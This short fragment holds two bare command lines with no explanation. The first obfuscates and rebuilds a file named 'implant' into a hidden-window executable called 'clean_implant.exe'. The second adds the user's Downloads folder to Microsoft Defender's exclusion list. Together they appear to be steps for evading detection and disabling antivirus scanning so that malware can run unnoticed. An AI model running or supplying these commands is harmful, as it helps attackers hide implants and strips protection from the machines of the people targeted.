garble -literals -tiny -seed=random build -ldflags="-s -w -H=windowsgui" -o /tmp/clean_implant.exe /tmp/implant.exe


powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"
